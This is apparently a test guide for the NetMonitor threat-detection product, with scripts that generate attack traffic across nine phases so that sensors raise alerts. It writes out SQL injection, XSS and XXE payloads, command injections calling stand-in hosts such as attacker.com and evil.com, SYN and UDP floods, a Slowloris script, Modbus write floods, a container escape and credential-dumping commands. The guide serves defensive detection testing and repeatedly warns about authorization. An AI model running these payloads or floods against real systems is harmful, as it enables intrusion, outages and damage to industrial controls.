# NetMonitor Threat Detection Test Scenarios

**Complete testing guide for all 60 threat types**

Version: 1.0
Last Updated: 2026-01-06
Purpose: Validate threat detection from separate test host

---

## IMPORTANT: Testing Safety Guidelines

**READ BEFORE TESTING:**

1. **Isolated Network**: Run tests ONLY on isolated test networks
2. **Authorization**: Obtain written permission before testing
3. **Legal Compliance**: Ensure compliance with local laws
4. **Production Systems**: NEVER test on production ICS/OT systems
5. **Notification**: Inform security team before testing
6. **Monitoring**: Have SOC staff monitor alerts during tests

**This document is for authorized security testing only. Misuse may violate laws.**

---

## Test Environment Setup

### Prerequisites

**Test Host Requirements:**
- Linux/Unix system (Ubuntu 22.04+ recommended)
- Python 3.8+
- Network connectivity to NetMonitor sensors
- Root/sudo access for packet generation

**NetMonitor Requirements:**
- SOC server running and accessible
- At least one sensor deployed
- Sensor monitoring test network traffic
- Web UI accessible for viewing alerts

### Install Testing Tools

```bash
#!/bin/bash
# install_test_tools.sh

# Update package lists
sudo apt-get update

# Install network testing tools
sudo apt-get install -y \
    nmap \
    hping3 \
    curl \
    wget \
    netcat \
    dnsutils \
    tcpdump \
    wireshark-common \
    python3-pip \
    python3-scapy \
    jq

# Install Python packages
pip3 install requests pymodbus dnspython

# Install Docker (for container tests)
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

echo "Test tools installed successfully"
```

---

## Phase 1: Core Advanced Threats (6 tests)

### Test 1.1: Cryptomining Detection

**What it tests**: Stratum protocol detection on mining ports

```bash
#!/bin/bash
# Test cryptomining detection

# Connect to known Stratum mining pool (simulated)
for port in 3333 4444 8333; do
    echo "Testing Stratum port $port..."
    nc -zv pool.supportxmr.com $port
    sleep 2
done

# Send Stratum protocol handshake
echo '{"id": 1, "method": "login", "params": {"login": "test", "pass": "x", "agent": "xmrig/6.18.0"}}' | nc pool.supportxmr.com 3333

# Expected: CRYPTOMINING_DETECTED alert
```

### Test 1.2: Phishing Domain Detection

**What it tests**: DNS queries to known phishing domains

```bash
#!/bin/bash
# Test phishing detection

# Query known phishing domains (from OpenPhish feed)
# Note: Use test domains that are known to be in the feed but are inactive

for domain in $(curl -s https://openphish.com/feed.txt | head -5); do
    echo "Testing phishing domain: $domain"
    nslookup $domain
    sleep 1
done

# Expected: PHISHING_DOMAIN_QUERY alert
```

### Test 1.3: Tor Exit Node Detection

**What it tests**: Connections to Tor exit nodes

```bash
#!/bin/bash
# Test Tor detection

# Get Tor exit node IPs
TOR_NODES=$(curl -s https://check.torproject.org/torbulkexitlist | head -5)

# Attempt connections to Tor exit nodes
for node in $TOR_NODES; do
    echo "Testing Tor exit node: $node"
    nc -zv -w 2 $node 9001 2>&1
    sleep 1
done

# Query .onion domain
nslookup 3g2upl4pq6kufc4m.onion  # DuckDuckGo onion address

# Expected: TOR_EXIT_NODE_CONNECTION alert
```

### Test 1.4: VPN Tunnel Detection

**What it tests**: OpenVPN, WireGuard, IPsec protocols

```bash
#!/bin/bash
# Test VPN detection

# Simulate OpenVPN handshake (UDP 1194)
echo -ne '\x38\x01\x00\x00\x00\x00\x00\x00\x00' | nc -u -w1 vpn.example.com 1194

# Simulate WireGuard packet (UDP 51820)
hping3 --udp -p 51820 -c 1 wireguard.example.com

# Simulate IPsec handshake (UDP 500)
hping3 --udp -p 500 -c 1 ipsec.example.com

# Expected: VPN tunnel detection alerts
```

### Test 1.5: Cloud Metadata Access (SSRF)

**What it tests**: Access to AWS/Azure/GCP metadata endpoints

```bash
#!/bin/bash
# Test cloud metadata detection

# Simulate SSRF to AWS metadata
curl http://169.254.169.254/latest/meta-data/

# HTTP request with cloud metadata in parameters
curl "http://target-server.local/fetch?url=http://169.254.169.254/latest/user-data"

# DNS query for GCP metadata
nslookup metadata.google.internal

# Expected: CLOUD_METADATA_ACCESS alert
```

### Test 1.6: DNS Anomaly Detection

**What it tests**: High DNS query rates, DGA domains

```bash
#!/bin/bash
# Test DNS anomaly detection

# Generate high DNS query rate
for i in {1..150}; do
    nslookup random$i.example.com &
done
wait

# Query DGA-like domains (long, random)
for i in {1..10}; do
    RANDOM_DOMAIN=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 16 | head -n 1)
    nslookup ${RANDOM_DOMAIN}.malware-c2.com
    sleep 0.5
done

# Expected: DNS_ANOMALY, DNS_DGA_DETECTED alerts
```

---

## Phase 2: Web Application Security (8 tests)

### Test 2.1: SQL Injection

**What it tests**: SQLi patterns in HTTP requests

```bash
#!/bin/bash
# Test SQL injection detection

TARGET="http://test-webapp.local"

# Classic SQLi payloads
curl "$TARGET/search?q=' OR '1'='1"
curl "$TARGET/login.php?user=admin' OR 1=1--&pass=x"
curl "$TARGET/product.php?id=1 UNION SELECT NULL,username,password FROM users--"
curl -X POST "$TARGET/api/query" -d "sql=SELECT * FROM admin WHERE 1=1; DROP TABLE users;"

# Expected: SQL_INJECTION_ATTEMPT alerts
```

### Test 2.2: XSS (Cross-Site Scripting)

```bash
#!/bin/bash
# Test XSS detection

curl "$TARGET/comment?text=<script>alert('XSS')</script>"
curl "$TARGET/profile?bio=<img src=x onerror=alert(1)>"
curl "$TARGET/search?q=<svg onload=alert('XSS')>"
curl -X POST "$TARGET/feedback" -d "message=<iframe src='javascript:alert(1)'></iframe>"

# Expected: XSS_ATTEMPT alerts
```

### Test 2.3: Command Injection

```bash
#!/bin/bash
# Test command injection detection

curl "$TARGET/ping?host=8.8.8.8;cat /etc/passwd"
curl "$TARGET/exec?cmd=ls | nc attacker.com 4444"
curl "$TARGET/run?command=whoami && wget http://evil.com/shell.sh"
curl "$TARGET/tool?file=/etc/passwd%00.jpg"

# Expected: COMMAND_INJECTION_ATTEMPT alerts
```

### Test 2.4: Path Traversal

```bash
#!/bin/bash
# Test path traversal detection

curl "$TARGET/download?file=../../../etc/passwd"
curl "$TARGET/view?page=....//....//....//etc/shadow"
curl "$TARGET/file?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
curl "$TARGET/read?doc=/etc/passwd%00.pdf"

# Expected: PATH_TRAVERSAL_ATTEMPT alerts
```

### Test 2.5: XXE (XML External Entity)

```bash
#!/bin/bash
# Test XXE detection

curl -X POST "$TARGET/api/xml" -H "Content-Type: application/xml" -d '
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>'

# Expected: XXE_ATTEMPT alert
```

### Test 2.6: SSRF (Server-Side Request Forgery)

```bash
#!/bin/bash
# Test SSRF detection

curl "$TARGET/fetch?url=http://127.0.0.1:22"
curl "$TARGET/proxy?target=http://10.0.0.1/admin"
curl "$TARGET/webhook?callback=http://169.254.169.254/latest/meta-data/"
curl "$TARGET/image?src=http://localhost:3306"

# Expected: SSRF_ATTEMPT alerts
```

### Test 2.7: WebShell Detection

```bash
#!/bin/bash
# Test webshell detection

# Upload suspicious PHP file
curl -X POST "$TARGET/upload.php" -F "file=@/tmp/shell.php"

# WebShell command patterns in HTTP
curl "$TARGET/shell.php?cmd=system('whoami')"
curl "$TARGET/cmd.php?c=eval(base64_decode('c3lzdGVtKCdscycp'))"

# Expected: WEBSHELL_DETECTED alerts
```

### Test 2.8: API Abuse

```bash
#!/bin/bash
# Test API rate limiting detection

# High API request rate
for i in {1..150}; do
    curl "$TARGET/api/users" -H "Authorization: Bearer test-token" &
done
wait

# Endpoint abuse
for i in {1..75}; do
    curl "$TARGET/api/admin/users" &
done
wait

# Expected: API_ABUSE_RATE_LIMIT, API_ABUSE_ENDPOINT alerts
```

---

## Phase 3: DDoS & Resource Exhaustion (8 tests)

### Test 3.1: SYN Flood

```bash
#!/bin/bash
# Test SYN flood detection

# Generate SYN packets (requires root)
sudo hping3 --syn --flood -p 80 target-server.local

# Limited SYN flood (safer)
sudo hping3 --syn -c 200 --faster -p 80 target-server.local

# Expected: SYN_FLOOD_ATTACK alert
```

### Test 3.2: UDP Flood

```bash
#!/bin/bash
# Test UDP flood detection

# UDP flood to random ports
sudo hping3 --udp --flood -p 53 target-server.local

# Limited UDP flood
sudo hping3 --udp -c 1000 --faster --rand-dest target-network.local

# Expected: UDP_FLOOD_ATTACK alert
```

### Test 3.3: HTTP Flood (Layer 7 DDoS)

```bash
#!/bin/bash
# Test HTTP flood detection

# HTTP GET flood
for i in {1..300}; do
    curl -s "$TARGET/" > /dev/null &
done
wait

# HTTP POST flood
for i in {1..250}; do
    curl -X POST -s "$TARGET/api/search" -d "q=test$i" > /dev/null &
done
wait

# Expected: HTTP_FLOOD_ATTACK alert
```

### Test 3.4: Slowloris

```bash
#!/bin/bash
# Test Slowloris detection

# Python Slowloris script
python3 << 'EOF'
import socket
import time

target = "target-server.local"
port = 80
sockets = []

# Create 100 slow connections
for i in range(100):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
        sockets.append(s)
    except:
        pass
    time.sleep(0.1)

# Keep connections alive with slow headers
for s in sockets:
    try:
        s.send(b"X-a: b\r\n")
    except:
        pass
    time.sleep(10)

print(f"Created {len(sockets)} slow connections")
EOF

# Expected: SLOWLORIS_ATTACK alert
```

### Test 3.5: DNS Amplification

```bash
#!/bin/bash
# Test DNS amplification detection

# Send ANY queries (large responses)
for i in {1..20}; do
    dig ANY @8.8.8.8 example.com
    sleep 0.2
done

# Expected: DNS_AMPLIFICATION_ATTACK alert
```

### Test 3.6: NTP Amplification

```bash
#!/bin/bash
# Test NTP amplification (safe - no actual amplification)

# NTP monlist request (deprecated command)
echo -ne '\x17\x00\x03\x2a' | nc -u -w1 pool.ntp.org 123

# Expected: NTP amplification detection (if implemented)
```

### Test 3.7: Connection Exhaustion

```bash
#!/bin/bash
# Test connection exhaustion

# Open many connections
for i in {1..1500}; do
    nc -zv target-server.local 80 &
done
wait

# Expected: CONNECTION_EXHAUSTION alert
```

### Test 3.8: Bandwidth Saturation

```bash
#!/bin/bash
# Test bandwidth saturation

# Generate high bandwidth traffic (requires iperf)
iperf3 -c target-server.local -t 60 -P 10

# Alternative: Large file transfer
for i in {1..20}; do
    dd if=/dev/zero bs=1M count=100 | nc target-server.local 9999 &
done
wait

# Expected: BANDWIDTH_SATURATION alert
```

---

## Phase 4: Ransomware Indicators (5 tests)

### Test 4.1: SMB Mass Encryption

```bash
#!/bin/bash
# Test SMB mass file operations (safe simulation)

# Rapid SMB file access (requires smbclient)
for i in {1..150}; do
    smbclient //server/share -U user%pass -c "ls" &
done
wait

# Expected: RANSOMWARE_MASS_ENCRYPTION alert
```

### Test 4.2: Crypto Extension Detection

```bash
#!/bin/bash
# Test ransomware extension detection

# Create files with ransomware extensions (safe - no encryption)
touch /tmp/test.{encrypted,locked,crypto,crypted,enc}

# Transfer via SMB/HTTP
smbclient //server/share -U user%pass -c "put /tmp/test.encrypted"

# Expected: RANSOMWARE_CRYPTO_EXTENSION alert
```

### Test 4.3: Ransom Note Detection

```bash
#!/bin/bash
# Test ransom note detection

# Create ransom note with keywords
cat > /tmp/README.txt << 'EOF'
Your files have been encrypted!
To decrypt your data, you must pay 0.5 Bitcoin to wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
For decryption key, contact us at: decrypt@ransomware.onion
Payment must be received within 72 hours or files will be permanently lost.
EOF

# Transfer ransom note
smbclient //server/share -U user%pass -c "put /tmp/README.txt"

# Expected: RANSOMWARE_RANSOM_NOTE alert
```

### Test 4.4: Shadow Copy Deletion

```bash
#!/bin/bash
# Test shadow copy deletion detection (Windows-specific)

# Simulate vssadmin command in HTTP/SMB traffic
curl "$TARGET/exec?cmd=vssadmin delete shadows /all /quiet"

# Expected: RANSOMWARE_SHADOW_COPY_DELETION alert
```

### Test 4.5: Backup Deletion

```bash
#!/bin/bash
# Test backup deletion detection

# Simulate wbadmin backup deletion
curl "$TARGET/run?cmd=wbadmin delete backup"

# Expected: RANSOMWARE_BACKUP_DELETION alert
```

---

## Phase 5: IoT & Smart Device Security (8 tests)

### Test 5.1: IoT Botnet (Mirai)

```bash
#!/bin/bash
# Test IoT botnet detection

# Telnet brute force with default credentials
for cred in "admin:admin" "root:root" "admin:password" "ubnt:ubnt"; do
    IFS=':' read -r user pass <<< "$cred"
    echo "Testing $user:$pass"
    (sleep 1; echo "$user"; sleep 1; echo "$pass"; sleep 1) | telnet iot-device.local
    sleep 2
done

# Expected: IOT_BOTNET_ACTIVITY alert
```

### Test 5.2: UPnP Exploit

```bash
#!/bin/bash
# Test UPnP detection

# SSDP discovery flood
for i in {1..150}; do
    echo -ne "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n" | nc -u -w1 239.255.255.250 1900
done

# Expected: UPNP_EXPLOIT_ATTEMPT alert
```

### Test 5.3: MQTT Abuse

```bash
#!/bin/bash
# Test MQTT abuse (requires mosquitto_pub)

# High MQTT publish rate
for i in {1..1500}; do
    mosquitto_pub -h mqtt-broker.local -t "test/topic" -m "message$i" &
done
wait

# Expected: MQTT_ABUSE alert
```

### Test 5.4-5.8: Additional IoT Protocols

```bash
#!/bin/bash
# Test RTSP (port 554)
curl rtsp://camera.local:554/stream

# Test CoAP (UDP 5683)
echo -ne '\x40\x01\x00\x00' | nc -u camera.local 5683

# Z-Wave/Zigbee testing requires specialized hardware
# Expected: Protocol-specific alerts
```

---

## Phase 6: OT/ICS Protocol Security (6 tests)

**WARNING: NEVER test on production ICS systems**

### Test 6.1: Modbus Attack

```python
#!/usr/bin/env python3
# test_modbus_attack.py

from pymodbus.client import ModbusTcpClient

# Connect to test Modbus server
client = ModbusTcpClient('test-plc.local', port=502)

if client.connect():
    print("Testing Modbus write operations...")

    # Trigger write operations threshold (50 writes in 60 seconds)
    for i in range(60):
        # Write to holding registers (function code 16)
        client.write_register(100 + i, i, unit=1)
        time.sleep(0.5)

    client.close()
    print("Modbus test complete")

# Expected: MODBUS_ATTACK alert
```

### Test 6.2: DNP3 Attack

```bash
#!/bin/bash
# Test DNP3 detection (port 20000)

# Send DNP3 protocol packets
# Note: Requires dnp3 library or packet crafting
python3 << 'EOF'
from scapy.all import *
import time

target = "test-scada.local"
port = 20000

# Craft DNP3 packets (basic structure)
for i in range(150):
    pkt = IP(dst=target)/TCP(dport=port)/Raw(load=b'\x05\x64\x05\xc0\x01\x00\x00\x04')
    send(pkt, verbose=0)
    time.sleep(0.3)

print("DNP3 test complete")
EOF

# Expected: DNP3_ATTACK alert
```

### Test 6.3: IEC-104 Attack

```bash
#!/bin/bash
# Test IEC-104 detection (port 2404)

# Send IEC 60870-5-104 control commands
for i in {1..75}; do
    echo -ne '\x68\x04\x07\x00\x00\x00' | nc test-scada.local 2404
    sleep 0.5
done

# Expected: IEC104_ATTACK alert
```

### Test 6.4-6.6: Additional OT Protocols

```bash
#!/bin/bash
# BACnet (UDP 47808)
echo -ne '\x81\x0a\x00\x11\x01\x20' | nc -u building-automation.local 47808

# Profinet (port 34964)
nc -zv industrial-plc.local 34964

# EtherNet/IP (port 44818)
nc -zv allen-bradley-plc.local 44818

# Expected: Protocol-specific alerts
```

---

## Phase 7: Container & Orchestration (4 tests)

### Test 7.1: Docker Escape Attempt

```bash
#!/bin/bash
# Test Docker escape detection

# Access Docker socket (dangerous in production!)
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock alpine sh -c "ls -la /var/run/docker.sock"

# Privileged container
docker run --privileged --rm alpine sh -c "mount; nsenter --target 1 --mount --uts --ipc --net --pid -- sh"

# Expected: DOCKER_ESCAPE_ATTEMPT alert
```

### Test 7.2: Kubernetes API Exploitation

```bash
#!/bin/bash
# Test K8s API abuse

# High K8s API request rate (requires kubectl)
for i in {1..150}; do
    kubectl get pods --all-namespaces &
done
wait

# Attempt to list secrets
for i in {1..50}; do
    kubectl get secrets --all-namespaces &
done
wait

# Expected: K8S_API_EXPLOIT alert
```

### Test 7.3-7.4: Registry and Privileged Containers

```bash
#!/bin/bash
# Pull from unknown registry
docker pull unknown-registry.com/malicious-image:latest

# Run privileged container
docker run --privileged --cap-add=ALL --rm alpine /bin/sh

# Expected: CONTAINER_REGISTRY_POISONING, PRIVILEGED_CONTAINER alerts
```

---

## Phase 8: Advanced Evasion (4 tests)

### Test 8.1: IP Fragmentation Attack

```bash
#!/bin/bash
# Test fragmentation detection

# Send fragmented packets
sudo hping3 -c 150 --frag -p 80 target-server.local

# Overlapping fragments (Teardrop-style)
sudo hping3 --flood --frag -p 80 target-server.local

# Expected: FRAGMENTATION_ATTACK alert
```

### Test 8.2: Protocol Tunneling

```bash
#!/bin/bash
# Test DNS tunneling

# Long DNS subdomains (data exfiltration simulation)
for i in {1..60}; do
    LONG_SUBDOMAIN=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 60 | head -n 1)
    nslookup ${LONG_SUBDOMAIN}.attacker-c2.com
    sleep 0.5
done

# ICMP tunneling
sudo hping3 --icmp --data 500 -c 20 target-server.local

# Expected: PROTOCOL_TUNNELING alert
```

### Test 8.3: Polymorphic Malware

```bash
#!/bin/bash
# Test polymorphic malware detection

# Transfer files with varying hashes
for i in {1..25}; do
    # Create file with random data
    dd if=/dev/urandom of=/tmp/variant_$i.bin bs=1K count=100
    # Transfer via HTTP
    curl -X POST "$TARGET/upload" -F "file=@/tmp/variant_$i.bin"
    sleep 1
done

# Expected: POLYMORPHIC_MALWARE alert (if pattern detected)
```

### Test 8.4: DGA (Domain Generation Algorithm)

```bash
#!/bin/bash
# Test DGA detection

# Query random DGA-like domains
for i in {1..10}; do
    RANDOM_DOMAIN=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 16 | head -n 1)
    nslookup ${RANDOM_DOMAIN}.com
    sleep 1
done

# Expected: DGA_DETECTED alert
```

---

## Phase 9: Kill Chain Detection (10 tests)

### Test 9.1: Lateral Movement

```bash
#!/bin/bash
# Test lateral movement detection

# SMB scanning across multiple hosts
for ip in 192.168.1.{10..20}; do
    smbclient -L $ip -N &
done
wait

# RDP brute force attempts
for ip in 192.168.1.{10..15}; do
    for i in {1..5}; do
        nc -zv $ip 3389 &
    done
done
wait

# Expected: LATERAL_MOVEMENT alert
```

### Test 9.2: Data Exfiltration

```bash
#!/bin/bash
# Test data exfiltration detection

# Transfer >100 MB to external server
dd if=/dev/zero bs=1M count=150 | nc external-server.com 9999 &

# Multiple external connections
for i in {1..25}; do
    curl -X POST https://external$i.com/upload -d "data=test" &
done
wait

# Expected: DATA_EXFILTRATION alert
```

### Test 9.3: Privilege Escalation

```bash
#!/bin/bash
# Test privilege escalation detection

# Simulate sudo abuse
for i in {1..10}; do
    curl "$TARGET/exec?cmd=sudo su -"
    sleep 1
done

# SetUID binary access
curl "$TARGET/run?cmd=/usr/bin/passwd"

# Expected: PRIVILEGE_ESCALATION alert
```

### Test 9.4: Persistence Mechanisms

```bash
#!/bin/bash
# Test persistence detection

# Simulate cron job creation
curl "$TARGET/exec?cmd=crontab -e"

# Registry Run key (Windows)
curl "$TARGET/run?cmd=reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"

# Startup folder modification
curl "$TARGET/write?file=/etc/systemd/system/malware.service"

# Expected: PERSISTENCE_MECHANISM alert
```

### Test 9.5: Credential Dumping

```bash
#!/bin/bash
# Test credential dumping detection

# Mimikatz patterns
curl "$TARGET/exec?cmd=mimikatz.exe"

# LSASS memory access
curl "$TARGET/run?cmd=procdump -ma lsass.exe lsass.dmp"

# SAM/NTDS.dit access
curl "$TARGET/read?file=C:\\Windows\\System32\\config\\SAM"

# Expected: CREDENTIAL_DUMPING alert
```

### Test 9.6-9.10: Additional Kill Chain Tests

```bash
#!/bin/bash
# LOLBins abuse
curl "$TARGET/exec?cmd=certutil -urlcache -split -f http://evil.com/payload.exe"

# PowerShell encoded commands
curl "$TARGET/run?cmd=powershell -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0A"

# WMI lateral movement
curl "$TARGET/exec?cmd=wmic /node:target process call create cmd.exe"

# Expected: LOLBINS, MEMORY_INJECTION, REGISTRY_MANIPULATION, SCHEDULED_TASK_ABUSE alerts
```

---

## Automated Test Suite

### Complete Test Runner

```bash
#!/bin/bash
# run_all_tests.sh - Execute all 60 threat detection tests

set -e

TARGET_SERVER="http://test-webapp.local"
SENSOR_IP="192.168.1.100"
SOC_URL="http://soc-server.local"

echo "=== NetMonitor Threat Detection Test Suite ==="
echo "Target: $TARGET_SERVER"
echo "Sensor: $SENSOR_IP"
echo "SOC: $SOC_URL"
echo ""

# Function to run test and check for alert
run_test() {
    local test_name=$1
    local test_command=$2

    echo "Running: $test_name"
    eval "$test_command"
    sleep 10  # Wait for alert processing

    # Check for alert via API
    ALERT_COUNT=$(curl -s "$SOC_URL/api/alerts?type=$test_name&minutes=5" | jq '.count')

    if [ "$ALERT_COUNT" -gt 0 ]; then
        echo "✅ PASS: $test_name detected ($ALERT_COUNT alerts)"
    else
        echo "❌ FAIL: $test_name not detected"
    fi

    sleep 5
}

# Phase 1 Tests
echo "=== Phase 1: Core Advanced Threats ==="
run_test "CRYPTOMINING_DETECTED" "nc -zv pool.supportxmr.com 3333"
run_test "PHISHING_DOMAIN_QUERY" "nslookup malicious-phish.example.com"
run_test "TOR_EXIT_NODE_CONNECTION" "nc -zv tor-exit-node.local 9001"
# ... (add all tests)

echo ""
echo "=== Test Suite Complete ==="
echo "Check NetMonitor Web UI for detailed alerts: $SOC_URL/alerts"
```

---

## Validation Checklist

After running tests, verify:

- [ ] All 60 threat types generate alerts
- [ ] Alerts appear in Web UI within 60 seconds
- [ ] Alert details contain correct source/destination IPs
- [ ] Severity levels are appropriate
- [ ] PCAP files saved (if enabled)
- [ ] Database contains alert entries
- [ ] MCP API returns correct threat data
- [ ] No false negatives on repeated tests
- [ ] Sensor performance remains stable
- [ ] SOC dashboard updates in real-time

---

## Troubleshooting Failed Tests

### No Alerts Generated

**Check 1: Is threat detection enabled?**
```sql
SELECT parameter_path, parameter_value
FROM sensor_configs
WHERE parameter_path LIKE 'threat.%.enabled'
ORDER BY parameter_path;
```

**Check 2: Is sensor capturing traffic?**
```bash
ssh sensor-host
sudo tcpdump -i eth0 -c 10
```

**Check 3: Check sensor logs**
```bash
tail -f /var/log/netmonitor/sensor.log | grep -i "threat\|alert"
```

### False Negatives

**Tune detection sensitivity**:
```sql
-- Lower thresholds for testing
UPDATE sensor_configs
SET parameter_value = '10'  -- From default 50
WHERE parameter_path = 'threat.lateral_movement.smb_targets_threshold';
```

### Network Issues

**Verify connectivity**:
```bash
# From test host to sensor
ping sensor-host

# From sensor to SOC
curl -I http://soc-server.local/api/health
```

---

## Best Practices

1. **Test in Phases**: Run tests by phase, not all at once
2. **Monitor SOC**: Have Web UI open during testing
3. **Document Results**: Note which tests passed/failed
4. **Network Capture**: Run tcpdump on sensor for debugging
5. **Timing**: Space tests 30-60 seconds apart
6. **Cleanup**: Clear alerts between test runs
7. **Baseline**: Establish normal traffic before testing

---

## Legal and Ethical Guidelines

**DO:**
- ✅ Get written authorization before testing
- ✅ Test only on systems you own/control
- ✅ Notify security team of testing schedule
- ✅ Use isolated test networks
- ✅ Document all testing activities

**DON'T:**
- ❌ Test on production systems without approval
- ❌ Test on third-party networks
- ❌ Use real malware/exploits
- ❌ Launch actual attacks
- ❌ Test ICS/OT systems in operation

**Violation of these guidelines may result in criminal prosecution.**

---

## Support

For questions or issues:
- Documentation: `/home/user/netmonitor/THREAT_DETECTION_GUIDE.md`
- GitHub: (repository URL)
- Email: support@netmonitor.local

**Version**: 1.0
**Last Updated**: 2026-01-06
**Total Tests**: 60
**Coverage**: All 9 phases
